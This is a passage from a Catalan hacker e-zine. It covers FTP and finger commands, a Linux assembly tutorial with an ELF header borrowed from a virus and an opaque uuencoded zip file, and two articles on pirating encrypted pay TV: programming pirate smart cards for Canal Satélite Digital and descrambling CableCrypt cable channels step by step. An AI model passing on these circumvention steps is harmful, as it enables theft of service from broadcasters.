    !            -Sortir
    bye          -Acaba la sessió ftp i tant la tanca.
    close        -Acaba la sessió sense tancar l'aplicació ftp.
    cd           -Canvia de directori.
    delete       -Borra un arxiu del servidor al servidor que estem contectats
    dir          -Inutil dir perque serveix...   xDD
    disconnect   -Doncs això... que et desconecta del servidor
    get          -Serveix per baixar qualsevol ariu que vulguis
    ls           -Igual que el dir  
    mdir         -Mostra el contingut de varis directoris en el servidor remot.
    mdelete      -Borra varis arxius en el servidor remot.
    mkdir        -Crea un directori igual que en DOS.... Linux.
    mget         -Recupera (fa un download) de varis arxius del servidor
    mput         -Envia arxius al servidor remot. (fa un upload)
    open         -Es coneta al servidor ftp, exemple: open 212.21.92.121
    put          -Envia un arxiu
    quit         -Acaba la sessió d'ftp i tanca l'aplicació
    pwd          -Mostra el nom del directori actual en el servidor remot
    recv         -Reb un arxiu.
    send         -Envia un arxiu.
    rmdir        -Elimina un directori en el servidor remot.
    rename       -Canvia el nom del directori
    user         -T'indentifica en el servidor remot per donar els permisos d'accés
    type         -Configura el tipu de tranferencia d'arixius

Per a mes informació mireu-vos la rfc 414 que la podeu baixar de:
 http://www.cis.ohio-state.edu/htbin/rfc/rfc414.html

=================================================================

			FINGER
		        ^^^^^^

port: 79

Per fer finger haurem de fer el següent:

finger usuari@host

o si volem veure tots els usuaris del servidor host hem de fer ...

finger @host


-BaRNer

    ----------------------------------------------------------------------
 ============================================================================
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
##############################################################################
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
 ============================================================================
    ----------------------------------------------------------------------

$0D$

.------------------------------------------------------------------.
|   __    _   __  _ _  ______  ___     ____________________________|
|  / /   (_) /  \/ / | \  \  \/  /    /____________________________|
| / /    / \/      | (  )  \    /    /_____________________________|
|/  \___/   \  /\  |  \/   /    \   /______________________________|
|\_______\___)/  \_\______/__/\__\ /_______________________________|
|____________________________     ______   ______  _____  ___      |
|____________________________\   /  __  \ /   ___\\     \/   /     |
|_____________________________\  \_/_/   \\___    \\         |     |
|______________________________\ / _     //        )   |\/|  |     |
|_______________________________\\_____._\\_______//___/  \___\    |
\____________________________________                              /
                                     \  Linux Asm ... by Pop.tPH  /
                                      \__________________________/

|
| Index:
\__
   \  1.- Introducció
    \  2.- Capçalera ELF
     \  3.- Programem!!!
      \  4.- Algun programa d'exemple...
       \  5.- Links d'ajuda...
        \________________________________


1.- Introducció:
    ------------

Lògicament era el pas següent dins de la programació en asm...
encara que tb podria haver passat al w32asm, pero certament el
trobo massa complicat per iniciar-se, aixi que com indica el
títol us parlaré sobre la programació en ensamblador (32 bits)
per linux, o sigui ELF binaries :).

Els ELF binaris diguessim que son com els EXE del Ms-DoS ;), el
ELF es la capçalera, igual k el msdos indica q es EXE amb MZ
doncs els fitxers de linux es marquen com a ELF amb el "header"
començat per [ 7Fh, 'ELF' ].

Primer anem a revissar la capçalera ja que es el primer que hem
de crear pq aixo el compilador no ens ho fa...treballarem amb
tasm o nasm (nasm millor). (o tb el gas (Gnu ASsembler)).

El Nasm el podeu baixar de:

 ftp://ftp.kernel.org/pub/software/devel/nasm/


I per linker el "ld".

Per compilar haurem de fer:


$ nasm -f elf fitxer.asm            # compila
$ ld -s -o fitxer fitxer.o          # linka
$ sh fitxer                         # executa

(si voleu ho podeu ficar tot en un fitxer script pq sigui més facil)

aixi:

$ vi /usr/bin/asm
  i
  nasm -f elf $1.asm
  ld -s -o $1 $1.o
  sh $1
  <esc>
  :w!
  :q
$ chmod 700 /usr/bin/asm


Per programar (com k no hi han entorns com el alab del dos) haurem de
fer aixi:

ALT+F1 : Primera terminal : "$ mc" : Midnight Commander : Anem al
         directori de treball i escribim "echo > filename.asm", llavors
         el marquem amb el cursor i premem F4 (edit), l'escribim i
         premem F2 (save), passem a la segona terminal i...
ALT+F2 : Segona terminal  : "$ asm xx" : L'utilitzarem per compilar i
         executar els programes que fem.





2.- Capçalera ELF:
    --------------

Per cert, aquesta informació l'he treta de 29A#4 del virus Diesel.

Doncs bé la capçalera ELF consta de dues parts, la capçalera ELF en
si i després la capçalera del programa. El tamany total de les dues
capçaleres és de 54h bytes

---[capçalera ELF]--------------------------------------------------

   MemBase      equ    08048000h
   ELF_Size     equ    54h
ELF:
   db           07F, 'ELF', 1, 1, 1, 9 dup (0)  
   dw           2, 3, 1, 0
   dd           offset Etiqueta_inicial_del programa + MemBase
   dd           offset Program_Header
   dd           0, 0
   dw           34h, 20h, 1
   dw           0, 0, 0

Program_Header:
   dd           01                             ; Segment cargable
   dd           00                             ; Offset fisic
   dd           MemBase                        ; Base de la imatge
   dd           MemBase                        ; El mateix (inutil :)
   dd           Tamany_del_programa + ELF_Size ; Tamany físic
   dd           Tamany_del_programa + ELF_Size ; Tamany en memòria
   dd           07                             ; Exec / Read / Write
   dd           1000h                          ; Alineament

---[capçalera ELF]--------------------------------------------------

La capçalera ELF (Executable and Linkable File) ja ens la crea el
compilador NASM i el linka el LD. O sigui q no cal k us empolleu
lo de dalt a no ser k volgueu fer virus per linux. :)





3.- Programem!!:
    ------------

Doncs vinga anem a programar, no té més, si hem seguit els textes d'asm de
les anteriors ezines haureu entès més o menys com va doncs bé sino us ho
torno a explicar :P

Utilitzarem els registres (aquest cas de 32 bits):
  EAX = per designar la funció de la interrupció que cridem
  EBX = handle
  ECX = contador
  EDX = apuntador 

  ESI = extended source index
  EDI = extended destinity index

  EBP = extended base pointer
  ESP = extended stack pointer

*NOTA* A l'hora de ficar els arguments caldra posar-los amb
  l'ordre descrit: EAX, EBX, ECX, EDX, ESI, EDI.

Avantatges de treballar en 32 bits:
  Els segments no toquen els collons.
  No tenim el limit del 64kb.

Desventatges:
  no podem utilitzar les altres interrupcions a no ser k estiguin
  punxades per algun programa, ja que les altres (10,16, etc.) són
  funcions de 16 bits i el ordinador quan està amb linux treballa
  en mode protegit (32 bits). i per tant no pot executar la
  interrupció i es crea i SegmentCore. (fallo i torna a la xel)

Un cop repassat comencem a parlar de les interrupcions...en el linux només
caldrà que utilitzem una interrupció que vé a ser com la 21h del DoS, que en
linux equival a la 80h.

Pero si ens fixem, totes les funcions les podem trobar documentades
 utilitzant 2 recursos.

1) els fitxers MAN, que ens proporcionen l'ajuda de les funcions de C.
   aixi: "$ man 2 write" o "$ man 2 read", etc.

   llavors podrem llegir una cosa aixi:
        write(int fd, const void *buf, size_t num);

   llavors haurem de separar les variables per registres:
        write           = EAX (mirant la taula de sota veurem k val 4)
        int fd          = EBX (stdout, stderr, etc..) stdout=1
        const void *buf = ECX (apuntador a l'inici de la frase)
        size_t num      = EDX (longitud de la frase)



2) Taules :

en akesta taula haurem de substituïr la funció k volguem (exit, write,
open...) pel nombre en decimal escrit a la dreta dins del registre EAX.

;
;asm/unistd.h
;

%assign SYS_exit		1
%assign SYS_fork		2
%assign SYS_read		3
%assign SYS_write		4
%assign SYS_open		5
%assign SYS_close		6
%assign SYS_waitpid		7
%assign SYS_creat		8
%assign SYS_link		9
%assign SYS_unlink		10
%assign SYS_execve		11
%assign SYS_chdir		12
%assign SYS_time		13
%assign SYS_mknod		14
%assign SYS_chmod		15
%assign SYS_lchown		16
%assign SYS_break		17
%assign SYS_oldstat		18
%assign SYS_lseek		19
%assign SYS_getpid		20
%assign SYS_mount		21
%assign SYS_umount		22
%assign SYS_setuid		23
%assign SYS_getuid		24
%assign SYS_stime		25
%assign SYS_ptrace		26
%assign SYS_alarm		27
%assign SYS_oldfstat		28
%assign SYS_pause		29
%assign SYS_utime		30
%assign SYS_stty		31
%assign SYS_gtty		32
%assign SYS_access		33
%assign SYS_nice		34
%assign SYS_ftime		35
%assign SYS_sync		36
%assign SYS_kill		37
%assign SYS_rename		38
%assign SYS_mkdir		39
%assign SYS_rmdir		40
%assign SYS_dup			41
%assign SYS_pipe		42
%assign SYS_times		43
%assign SYS_prof		44
%assign SYS_brk			45
%assign SYS_setgid		46
%assign SYS_getgid		47
%assign SYS_signal		48
%assign SYS_geteuid		49
%assign SYS_getegid		50
%assign SYS_acct		51
%assign SYS_umount2		52
%assign SYS_lock		53
%assign SYS_ioctl		54
%assign SYS_fcntl		55
%assign SYS_mpx			56
%assign SYS_setpgid		57
%assign SYS_ulimit		58
%assign SYS_oldolduname		59
%assign SYS_umask		60
%assign SYS_chroot		61
%assign SYS_ustat		62
%assign SYS_dup2		63
%assign SYS_getppid		64
%assign SYS_getpgrp		65
%assign SYS_setsid		66
%assign SYS_sigaction		67
%assign SYS_sgetmask		68
%assign SYS_ssetmask		69
%assign SYS_setreuid		70
%assign SYS_setregid		71
%assign SYS_sigsuspend		72
%assign SYS_sigpending		73
%assign SYS_sethostname		74
%assign SYS_setrlimit		75
%assign SYS_getrlimit		76
%assign SYS_getrusage		77
%assign SYS_gettimeofday	78
%assign SYS_settimeofday	79
%assign SYS_getgroups		80
%assign SYS_setgroups		81
%assign SYS_select		82
%assign SYS_symlink		83
%assign SYS_oldlstat		84
%assign SYS_readlink		85
%assign SYS_uselib		86
%assign SYS_swapon		87
%assign SYS_reboot		88
%assign SYS_readdir		89
%assign SYS_mmap		90
%assign SYS_munmap		91
%assign SYS_truncate		92
%assign SYS_ftruncate		93
%assign SYS_fchmod		94
%assign SYS_fchown		95
%assign SYS_getpriority		96
%assign SYS_setpriority		97
%assign SYS_profil		98
%assign SYS_statfs		99
%assign SYS_fstatfs		100
%assign SYS_ioperm		101
%assign SYS_socketcall		102
%assign SYS_syslog		103
%assign SYS_setitimer		104
%assign SYS_getitimer		105
%assign SYS_stat		106
%assign SYS_lstat		107
%assign SYS_fstat		108
%assign SYS_olduname		109
%assign SYS_iopl		110
%assign SYS_vhangup		111
%assign SYS_idle		112
%assign SYS_vm86old		113
%assign SYS_wait4		114
%assign SYS_swapoff		115
%assign SYS_sysinfo		116
%assign SYS_ipc			117
%assign SYS_fsync		118
%assign SYS_sigreturn		119
%assign SYS_clone		120
%assign SYS_setdomainname	121
%assign SYS_uname		122
%assign SYS_modify_ldt		123
%assign SYS_adjtimex		124
%assign SYS_mprotect		125
%assign SYS_sigprocmask		126
%assign SYS_create_module	127
%assign SYS_init_module		128
%assign SYS_delete_module	129
%assign SYS_get_kernel_syms	130
%assign SYS_quotactl		131
%assign SYS_getpgid		132
%assign SYS_fchdir		133
%assign SYS_bdflush		134
%assign SYS_sysfs		135
%assign SYS_personality		136
%assign SYS_afs_syscall		137
%assign SYS_setfsuid		138
%assign SYS_setfsgid		139
%assign SYS__llseek		140
%assign SYS_getdents		141
%assign SYS_newselect		142
%assign SYS_flock		143
%assign SYS_msync		144
%assign SYS_readv		145
%assign SYS_writev		146
%assign SYS_getsid		147
%assign SYS_fdatasync		148
%assign SYS_sysctl		149
%assign SYS_mlock		150
%assign SYS_munlock		151
%assign SYS_mlockall		152
%assign SYS_munlockall		153
%assign SYS_sched_setparam		154
%assign SYS_sched_getparam		155
%assign SYS_sched_setscheduler		156
%assign SYS_sched_getscheduler		157
%assign SYS_sched_yield		158
%assign SYS_sched_get_priority_max	159
%assign SYS_sched_get_priority_min	160
%assign SYS_sched_rr_get_interval	161
%assign SYS_nanosleep		162
%assign SYS_mremap		163
%assign SYS_setresuid		164
%assign SYS_getresuid		165
%assign SYS_vm86		166
%assign SYS_query_module	167
%assign SYS_poll		168
%assign SYS_nfsservctl		169
%assign SYS_setresgid		170
%assign SYS_getresgid		171
%assign SYS_prctl		172
%assign SYS_rt_sigreturn	173
%assign SYS_rt_sigaction	174
%assign SYS_rt_sigprocmask	175
%assign SYS_rt_sigpending	176
%assign SYS_rt_sigtimedwait	177
%assign SYS_rt_sigqueueinfo	178
%assign SYS_rt_sigsuspend	179
%assign SYS_pread		180
%assign SYS_pwrite		181
%assign SYS_chown		182
%assign SYS_getcwd		183
%assign SYS_capget		184
%assign SYS_capset		185
%assign SYS_sigaltstack		186
%assign SYS_sendfile		187


Si us heu fixat (no crec pq akesta llista es un pal de llarga xD)
haureu vist la funció SYS_SOCKETCALL, doncs bé amb akesta funció
podrem treballar amb mitjons (sockets) per fer conexions per xarxes
pero aixo ja ho veurem més endavant.

----------

En teoria amb els 2 mètodes anteriors podeu fer de tot, encara que
com que soc un bon noi us explicaré les principals funcions:


Tenim tres tipus d'entrades i sortides:
 0 - STDIN  (standard in) - teclat
 1 - STDOUT (standard out) - pantalla
 2 - STDERR (standard error) - pantalla


Anem a veure algunes de les funcions principals.

.---[ INT 80h ]--- -   -    -       -
|

EAX = 1 (sys_exit)
    Serveix per finalitzar el programa.

EAX = 3 (sys_read)
    EBX = 0 (stdin)
    ECX = apuntador a buffer
    EDX = llargaria del buffer

EAX = 4 (sys_write)
    EBX = 1 (stdout)
    ECX = apuntador a la frase
    EDX = llargaria de la frase

EAX = 162 (sys_nanosleep)
    EBX = nanosegons a estar parat
    ECX = 0

Bé us dono alguns exemples del man2 i la resta us espavileu vosaltres!
no voldreu k us ho deixi tot mastegat no? ;)

Estructura valida per:
 sys_creat, sys_mkdir, sys_open:

sys_creat {
       filename,
       flags (RO, WO, RW)
       }
       
       RO = 0
       WO = 1
       RW = 2
       

-->
Estructura valida per:
 sys_pread, sys_pwrite
 
sys_pread {
       fd (handle),
       buffer,
       size
       offset (del handle).
       }


I per acabar, una cosa bastant util, segur k si sabeu de C ja sabreu d
k parlo, dels ARGUMENTS!! (argc i argv), aclarem les coses...els
arguments són les paraules k s'escriuen a continuació del nom del
programa quan s'executa: per exemple:

$ ls -la pop
  ^  ^   ^
  |  |   |___ Argument 3
  |  |_______ Argument 2
  |__________ Argument 1

Ara ja ha quedat clara la cosa de ARGV (k es aixo), pero el ARGC no és
res més q el contador k indica quants arguments té el programa, o sigui
en l'exemple de dalt argc=3.

En ensamblador (si recordem...en msdos ens haviem de moure a la
possició 80h de la DTA dins del PSP), pero en linux, això està més
extés i permet una longitud quasi infinita pels arguments i no
limitada a 20h com en msdos. La forma de conseguir-ho es POPant la
pila només executar el programa, ja k el Linux graba en la pila totes
aquestes variables (ARGC, ARGV1, ARGV2...) d'aquesta forma:

Sr.Linux: Push Dword Argv3 ; pop
          Push Dword Argv2 ; -la
          Push Dword Argv1 ; ls
          Push Dword Argc  ; 3

I ara l'haurem d'obtindre aquests valors POPant.

Sr.programa:
          Pop Dword Argc  ; 3
          Pop Dword Argv1 ; possició de memoria k indica la cadena: ls
          Pop Dword Argv2 ; " ": -la
          Pop Dword Argv3 ; " ": pop

En la memòria podriem veure una cosa aixi:

PILA (eSP): 00 00 00 03 ; argc
            00 00 00 20 ; apunta a ls
            00 00 00 22 ; apunta a -la
            00 00 00 25 ; apunta a pop

MEMORIA:
            0000 0020: 0x6C 'l'
            0000 0021: 0x73 's'
            0000 0022: 0x2D '-'
            0000 0023: 0x6C 'l'
            0000 0024: 0x61 'a'
            0000 0025: 0x70 'p'
            0000 0026: 0x6F 'o'
            0000 0027: 0x70 'p'

Com podem observar ho graba tot junt, sense espais, es l'hora
d'utilitzar aquella operació...com es deia??? resta crec. I la
utilitzarem per calcular les longituds dels arguments:

 length ( argv1 ) = argv2 - argv1

Veig k us podreu apanyar solets, ja q no té gaire dificultat.



4.- Algun programa d'exemple...
    ---------------------------

----8<-------[example.asm]--------------------------------------------

; Programa exemple del manual de programacio en Assembler per Linux ;
;===================================================================;
; escrit per Pop.tPH / CatHack! amb el mc -e :)                     ;
;-------------------------------------------------------------------;
; Per compilar:                                                     ;
;  $ nasm -f elf example.asm                                        ;
;  $ ld -s -o example example.o                                     ;
;___________________________________________________________________;

section .code ;------------------------[ Memoria del programa RO (readonly) ]-
global _start                          ; El programa comenca a _start

_start:                                ; Aqui comenca el programa

  pop eax                              ; Agafem els arguments (argc)
  mov dword [argc],eax                 ; i els guardem.
  
  mov eax, 4                           ; sys_write (
  mov ebx, 1                           ;            STDOUT = 1,
  mov ecx, frase                       ;            frase,
  mov edx, frase_len                   ;            frase_len,
  int 0x80                             ;           );
  
  mov eax, 3                           ; sys_read ( 
  xor ebx, ebx         ; mov ebx, 0    ;           STDIN = 0,
  mov ecx, paraula                     ;           paraula,
  mov edx, 100                         ;           longitud=100bytes,
  int 0x80                             ;          );

  mov ecx, 100                         ; ecx = contador de bucles
  xor eax, eax                         ; eax = contador de possicions
busca_longitud_introduida:
  cmp byte [paraula+eax], 0xa          ; busca el return ( 0xA o 0Ah :)
  jz trobada
  inc eax
  loop busca_longitud_introduida

trobada:
  inc eax                              ; longitud+1 (tb agafem el return)
  mov ecx,eax                          ; movem eax (longitud) a ECX per
                                       ; fer el bucle.
mutate:
  mov dl, byte [paraula+ecx-1]         ; Mutacio de la paraula
  inc dl                               ;  - Augmenta en 1 el valor ascii
  mov byte [paraula+ecx-1], dl         ;    de cada lletra de la paraula.
  loop mutate
  
escriu:                                ; escriu la paraula resultant
  xchg edx, eax                        ; EDX (longitud) = EAX (longitud)
  mov eax, 4                           ; sys_write { StdOut,
  mov ebx, 1                           ;             Paraula,
  mov ecx, paraula                     ;             Longitud
  int 0x80                             ;            }
  
diu_arguments:
  mov eax, dword [argc]
  add al, '0'
  mov byte [argnum],al
  
  mov eax, 4
  mov ebx, 1
  mov ecx, argfrase
  mov edx, argfraselen
  int 0x80
  
sortida:                               ; sys_exit {
  mov eax, 1                           ;           return (0)
  int 0x80                             ;           }


section .data ;------------------------[ Memoria del programa RW (readwrite) ]
  frase db 'Programa exemple del Pop.tPH',0xa
        db ' - espero k us agradi, el k fa es dir quants arguments',0xa
	db '   te el programa, i ens demana una paraula k despres',0xa
	db '   l-escriura sumant el valor ascii de cada lletra en 1.',0xa,0xa
	db ' > INTRODUEIX UNA PARAULA: '
        frase_len equ $ - frase

  argfrase db 0xa,0xa,'Per cert!!! el programa l-has executat amb '
    argnum db 0
           db ' arguments.',0xa,0xa
	   argfraselen equ $ - argfrase
	
section .bss ;-------------------------[ Memoria del sistema lliure RW ]------
  paraula resb 100                     ; definim 100 bytes d'espai virtual
                                       ; per la paraula.
  argc resd 1                          ; 1 dd (dobleword) pel nombre d'args

----8<-------[example.asm]--------------------------------------------


---8<------[example.uue]----------------------------------------------

begin 666 Je.zip
M4$L#!!0````(`$NF,BD"+$+=\@$``&0#```"````2D65DS]OTU`0P%^:4$6>
MREJ0N"R(H36-5"3^"=42152J@E4U4M>+?316[=A][QG:B0P=@(GV&P!?(BD+
ML/<3,""5+\#`C+BS8VJD+CSI=/]^=^=GGU^M;SYI-!JJ.G.JJ<2SXU9[5?1<
M&5]5P+E;:EY=47]I9D1:'"A$8@NJR!?^,>=8%MD^8IF?Y7<^'IVTVA/!/PD[
M%>CT.UMGXTF35??;%)@X#8O05%3W\W@B,<<VU\Y_K;WY\O;X!KN_O[XN]/G/
MDUH_`<_&[V5*:^7#PK_#?LBP!^6P1J%\G>YJ3!#H@)(L)@@I!C_-7.L_=6`9
MR&2D4]B#W``R&49+P,0>/.<2`V&D83_'D>6LWLT38LL!`$M"9;/F2Q`!C9BF
M!$<(.4N&&O,8N5'((S055?$RF4!'N48P.:-6FKS`.-6`)H@B9B'`$"&.R3)$
M(^BZC@./8*.WO?7L<7]]8P?Z/0]\;\OK;WKWP7%\TA"0MIU.I_Y(/&N(1FX=
MY!8M8#(`=7$'[LJO9WM(T"/[,N*YGC&4#&+NMN+>NZN4:PX3BP/65I=Z6%DA
M6E3NP!CE!FDB_<0(2?W'N:;*79*5*':)G<6+52WWC4^'I3WCY-,#[^RPUJ?B
M;BJE:N5*N.LUO\K=GMFR^O(?6-;O+N&NJG)F=1YRP9U+N#]02P$"%``4````
M"`!+IC(I`BQ"W?(!``!D`P```@```````````"``MH$`````2D502P4&````
/``$``0`P````$@(`````
`
end

---8<------[example.uue]----------------------------------------------

5.- Links d'ajuda...
    ----------------

pagina:  http://linuxassembly.org
article: www.linuxgazette.com/issue53/boldyshev.html
nasm:    ftp://ftp.kernel.org/pub/software/devel/nasm/
biew:    http://biew.sourceforge.net/

*NOTA* el biew és com el hiew pero per linux, molt recomenable!!
       baixe-vos el amb format RPM. (i per instal.lar-lo feu:
       "$ rpm -i biew-5.1.2-1.i386.rpm" (on logicament el $ simbolitza
       la shell i les cometes no es fiquen :D).


Espero que us hagi sigut útil aquest article, ja que veig que la
programació en ASM per linux (a part de tindre molt de futur), és
molt més divertida que la de win95 (que és molt seqüencial), en canvi
en Linux, podem crear programes amb mitjons, rootshells, portscans,
etc. i programant al nostre ritme i ordre, no com en w32.

Suposo k en un futur...no molt llunyà podreu gaudir d'un altre
article en el k treballarem els mitjons* desde asm sota Linux,
i llavors serà quan començarem a fer bouncers, portscans, etc.
i començarà a ser més divertit k tota akesta teoria bàsica per
començar. :)

*mitjons = traducció literària de sockets.


Ens llegim en el proxim article!

         (ºoº)  -- POP!


per acabar us deixo amb una canço de "no veas no" :P



   No veas no: Hug
   ---------------
   Era el temps de castells, de remences i mansos,
   qui pobre no pagés era lliure i malabar. I en HUG, tot
   content, anava de poble en poble, poeta per dones,
   un galant pels marits.
   - "Tinc el pa que jo vull, tinc el vi que em donen,
   tinc l'amic que em cuida i escolta els meus dits.
   I de mi aquella gent que diu que sóc un trist pobre,
   però que és el que és el que em dones per ser tan feliç.
   Tinc el mar, tinc les ones, tinc els que veu l'ull,
   tinc l'amic que em cuida i em deixa fer el que vull"
   Va pensar en marxar cap a terres llunyanes
   a on el que feia no hagués estat mai vist.
   - "Sap de cants que fan ploure, et troba a l'enemic
   menja herbes que curen, has de creure el que et dic.
   Però vigila a la dona així que es faci nit,
   té un encant tot i pobre que se les fot al llist"
   - " Jugo amb nens, jugo amb velles, jugo amb el seu gos,
   jugo amb totes elles, com si un imbécil fós.
   I als nobles els dic sota la finestra,
   que jo sense terra em sento molt més ric"
   Però la màgia no es va entendre, ni les boles volant,
   ni el foc que a la boca semblava infernal
   Bruixot per l'esglesia, subversiu pels feudals, divertit
   pel poble, per tot li van voler mal
   "Condemnat per feliç, acusat per amic,
   humiliat per tranquil i el volen cremar viu.
   I el meu fill que es pregunta a on estarà l'HUG
   el "juga amb boles", que el troba a faltar"
   I malgrat el temps que ha passat d'ençà d'aquesta història,
   la cara del joglar es reflexa al meu mirall.


                              -Punks i Skins contra el feixisme!



==============================================================================
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
==============================================================================
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
==============================================================================

$0E$


///////////////////////////////////////////
//                                      //
//     Cau Canal Satélite Digital!     //
//                                    //
///////////////////////////////////////


Bones companys i companyes, en aquest article us explicarem per sobre com
s'ha aconseguit fer caure el sistema d'encriptació utilitzat pel Canal
Satélite Digital, SECA. Sabem que aquest potser no és un tema estrictament
h/p/a/v però segur que és de l'interès de molts i moltes de vosaltres.

Bé, comencem doncs, per desencriptar Mediaguard es va utilitzar una
interfície Season que ens permetia llegir l'intercanvi de dades entre el
receptor i la nostra targeta d'abonat. Primer es varen aconseguir treure
uns codis, els codis que utilitza la targeta oficial per a identificar-se
i deixar-nos veure els canals als que estem subscrits. Aviat van sortir
codis a internet que ens permetien veure diverses plataformes per
satèl·lit que utilitzan Mediaguard com són el Canal Satèl·lit francès i
holandès, entre d'altres. El problema de tot això és que s'havia d'anar
programant la tarja cada cop que canviaven els codis. La solució va ser
l'aparició dels autoupdates, que permetien a la targeta actualitzar-se amb
els nous codis, els del mes següent, que enviava CSD al nostre receptor
durant tot el mes anterior.

En poc temps van sortir les PicCard, GoldWaferCard, FunCard... Les dues
primeres són iguals en quant a funcionament, encara que la segona s'ha de
programar amb una interfície especial perquè els xips es troben amagats
dins la placa mentres que una PicCard té l'avantatge de poder treure els
xips i programar-los amb un programador qualsevol de PICs i EEPROMs. La
FunCard per la seva banda té una memòria 8 cops superior a les altres dues
i per tant estava més preparada per al futur, per poder evitar futurs
atacs de CSD contra les PicCards i les GoldWaferCards. No gens menys,
recentment han sortit les PicCard2 entre d'altres que tenen, almenys, la
mateixa memòria que una FunCard, però a un cost sensiblement inferior.
Inclús hi ha adaptadors per convertir la nostra PicCard en PicCard2. Però
això tansols serà útil si CSD decideix canviar el sistema d'encriptació,
cosa possible, vist que ja han començat a llençar atacs contra les
targetes pirates, sense gaire èxit, tot s'ha de dir.

I el que interessa a més persones, però com es fa tot això? Doncs molt
senzill. Suposant que ens decidim per la GoldWaferCard, necessitarem un
programador de PICs i EEPROMs qualsevol, almenys que puguin programar un
PIC 16F84 i una EEPROM 24C16. Després necessitarem evidentment la tarja
que ens podem fer nosaltres mateixos seguint plànols que trobarem per la
xarxa o bé comprant-la en tendes especialitzades. Si ens decidim per una
PicCard o una FunCard, necessitarem, apart de la targeta, els xips
corresponents i el seu programador. Per exemple, per a una PicCard,
necessitarem un programador qualsevol que programi el PIC i la EEPROM
d'abans, que serà diferent del de la GoldWaferCard perquè el de la PicCard
programa els xips un a un i el de la GoldWaferCard programa directament
els xips des de la interfície que té. En el cas de la FunCard, tot és
igual que la PicCard però més car :-)

Un cop aconseguit tot el material podem optar pels molts fitxers
disponibles a internet (passeu-vos per cryptos.da.ru) o bé per crear-nos
els nostres. Per començar seria millor utilitzar uns ja fets i testejats i
posteriorment experimentar amb els nostres. Hi ha molts fitxers .bin (per
a les EEPROMs) i molts fitxers .hex (pels PICs) i alguns donen problemes
amb segons quins receptors (n'hi ha de diferentes marques), o sigui que
potser haureu de provar-ne uns quants.

Un cop programats els xips, ja tansols queda inserir la tarja al receptor
i experimentar. Recomano que passeu per cryptos.da.ru i pels seus fòrums
perquè hi trobareu exemples i solucions als problemes més comuns, perquè
aquí tansols pretenem notificar i donar una ràpida pincellada del que s'ha
aconseguit fer, perquè encara han de caure molts altres! :-)

Fins llavors, salut i lluita companys/es!

<NOTE>
En contra del k moltes persones pensin, CSD no ha caigut. Ha sigut simplement
una estratègia comercial per poder vendre més aparells i tindre un major
nombre de clients contra Via Digital de la (T).
</NOTE>

LopeHack


==============================================================================
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
==============================================================================
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
==============================================================================


$0F$


						/////////////////////////
						/                       /
						/   Descrambling CATV   /
						/    by Brainstorm      /
						/                       /
						/////////////////////////


DISCLAIMER: PRIMER DE TOT PROHIBEIXO EXPRESSAMENT LA LECTURA DEL PRESENT
ARTICLE A QUALSEVOL CLIENT/TÉCNIC/OPERADOR O QUALSEVOL ALTRE PERSONATGE
RELACIONAT AMB MENTA S.A, AL IGUAL QUE DECLARO QUE LA INFORMACIO CONTINGUDA
EN AQUEST ARTICLE NOMES ES PER CONEIXER COM FUNCIONA EL SISTEMA D'ENCRIPTAT
CABLECRYPT (tm). NO EM FAIG RESPONSABLE EN ABSOLUT DE L'ÚS QUE SE LI DONI A
AQUESTS CONEIXEMENTS, EL LECTOR HA DE SER CONSCIENT QUE SI PORTA A TERME ELS
PROCEDIMENTS QUE DETALLO A CONTINUACIÓ, ESTARA COMETENT UN DELICTE TAL I COM
ESTA ESCRIT AL CONTRACTE DE MENTA S.A.


Doncs aqui estic amb el meu tercer article que encara que tard, ha arribat
:-). Bé, en aquest article parlaré sobre com desencriptar els canals de
pagament de la tele per cable...hum, em sembla que amb aquesta frase ja he
aconseguit la vostra atenció, no ? jeje, doncs posem-nos en marxa:

Primer de tot, CATV, significa "Cable TeleVision" (tonto ?, si). Actualment
en el nostre pais estan sorgint iniciatives (no es poden dir serveis perque
son bastant pobres en qualitat, però bé, fan el que poden...), aquests
operadors (o millor dit, aquest, MENTA, també anomenat CTC), ofereixen
serveis a través d'una basta xarxa de fibra òptica que es va estenent per
Catalunya, però al entrar a les cases dels particulars, els impulsos
lumínics que viatgen per la fibra òptica es transformen en impulsos
elèctrics. Perquè ? Doncs per interactuar amb els aparells domèstics com
l'ordinador, la televisió o el teléfon. Però lo més impressionant, és que
CTC, al igual que pràcticament tots els operadors de cable de USA, transmeten
TOTS els serveis a través de un simple cable coaxial. Això significa que
si tu t'has donat d'alta d'un servei, pots accedir a aquest servei en
concret, pero els altres serveis continuen "atrapats" en el mateix cable
(quina explicació més cutre, a partir d'ara intentaré ser més técnic), és
a dir, les frequencies restants (altres serveis), continuen sent emeses
per tota la xarxa de menta... oi que seria una pena no aprofitar-les ?
XDDD Peeeero, cal tenir en compte que els tecnics de menta no son tontets
(si mes no, no tant com sembla), i encripten la senyal de televisio amb
un sistema anomenat Cablecrypt (tm). Aquest algoritme de xifrat, a grans
trets, "destorota" la imatge (colors, sincronia, etc...), però curiosament
deixa intacte el so, cosa que no passa amb el conegut Nagravision (tm)
(Canal pus).

Per portar a terme l'experiment que detallaré a continuació, faran falta
les seguents coses:

- Targeta de TV, amb el xip BT8x8. (és molt recomanable que aquesta porti
  sintonitzador integrat, com per exemple els models de Avermedia S.A).
- Un programa anomenat "Cablecrypt decoder" (tb anomenat CCD) que es pot
  trobar a http://home.wanadoo.nl/~esnel/
- DirectX, o millor dit, DirectDraw.
- La mare de la ciencia.

Anem a al greix (chicha en català ?¿):

1.- Agafeu el cable coaxial de MENTA (sol ser blanc) i l'endolleu a sac
    pak a l'entrada d'antena de la capturadora de video (no es molt
    recomanable, pero es practic enganxar-ho amb cel·lo XDD).

2.- Amb el software de la capturadora, escanejeu tots els canals
    (ho fa automaticament), si no saps com fer-ho, llegeix el manual de la
